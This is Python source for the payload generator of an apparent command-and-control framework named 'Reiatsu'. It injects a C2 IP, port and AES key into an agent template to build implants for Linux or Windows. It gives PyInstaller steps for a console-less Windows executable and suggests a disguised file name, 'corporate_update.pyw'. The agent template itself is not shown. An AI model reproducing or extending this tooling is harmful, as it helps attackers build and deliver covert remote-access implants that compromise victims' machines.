import os
import sys
import argparse
import json
import platform

# ANSI Color Codes
RESET = '\033[0m'
BOLD = '\033[1m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
CYAN = '\033[36m'

def generate_payload(output_type, output_name):
    """Generate a customized agent payload for the specified platform."""
    root_dir = os.path.dirname(os.path.abspath(__file__))
    state_file = os.path.join(root_dir, 'server_state.json')
    template_file = os.path.join(root_dir, 'core', 'agent_template.py')
    output_dir = os.path.join(root_dir, 'payloads')

    if not os.path.exists(state_file):
        print(f"{RED}{BOLD}[-] FATAL: Server state file 'server_state.json' not found.{RESET}")
        print(f"{YELLOW}    Please run the C2 server (`reiatsu.py`) at least once to generate it.{RESET}")
        return

    if not os.path.exists(template_file):
        print(f"{RED}{BOLD}[-] FATAL: Agent template file 'core/agent_template.py' not found.{RESET}")
        return

    os.makedirs(output_dir, exist_ok=True)

    try:
        with open(state_file, 'r') as f:
            state = json.load(f)
        
        c2_ip = state.get('c2_ip')
        c2_port = state.get('c2_port')
        aes_key_b64 = state.get('aes_key_b64')

        if not all([c2_ip, c2_port, aes_key_b64]):
            print(f"{RED}{BOLD}[-] FATAL: The 'server_state.json' file is incomplete.{RESET}")
            print(f"{YELLOW}    It must contain 'c2_ip', 'c2_port', and 'aes_key_b64'. Try restarting the server.{RESET}")
            return

        with open(template_file, 'r') as f:
            template_code = f.read()

    except Exception as e:
        print(f"{RED}[-] Error reading configuration or template file: {e}{RESET}")
        return

    # Replace placeholders with actual configuration
    agent_code = template_code.replace('##C2_IP##', c2_ip)
    agent_code = agent_code.replace('##C2_PORT##', str(c2_port))
    agent_code = agent_code.replace('##AES_KEY_B64##', aes_key_b64)

    if output_name is None:
        ext = '.pyw' if output_type == 'win' else '.py'
        output_name = f'reiatsu_agent_{output_type}{ext}'
    
    output_path = os.path.join(output_dir, output_name)

    try:
        with open(output_path, 'w') as f:
            f.write(agent_code)
        
        print(f"\n{GREEN}{BOLD}[+] Payload generated successfully!{RESET}")
        print(f"    {CYAN}Type:{RESET}     {output_type}")
        print(f"    {CYAN}Location:{RESET} {output_path}")

        if output_type == 'win':
            print(f"\n{BOLD}{YELLOW}--- Windows Standalone Executable ---{RESET}")
            print("To create a standalone .exe, use PyInstaller:")
            print(f"  1. Install: {CYAN}pip install pyinstaller{RESET}")
            print(f"  2. Compile: {CYAN}pyinstaller --onefile --noconsole --name {os.path.splitext(output_name)[0]} {output_path}{RESET}")
            print(f"  3. Output will be in the '{BOLD}dist{RESET}' folder.")
            
    except Exception as e:
        print(f"{RED}[-] Error writing final payload file: {e}{RESET}")

def main():
    """Main entry point for the payload generator."""
    parser = argparse.ArgumentParser(
        description=f"{BOLD}{CYAN}Reiatsu Node Payload Generator{RESET}",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Example: python3 payload_generator.py --type win -o corporate_update.pyw"
    )
    
    parser.add_argument(
        '-t', '--type', 
        choices=['lin', 'win'], 
        required=True,
        help="Payload type: lin (Linux/macOS) or win (Windows)"
    )
    
    parser.add_argument(
        '-o', '--output',
        help="Optional output filename (e.g., 'agent.py')"
    )
    
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
        
    args = parser.parse_args()
    generate_payload(args.type, args.output)

if __name__ == "__main__":
    main()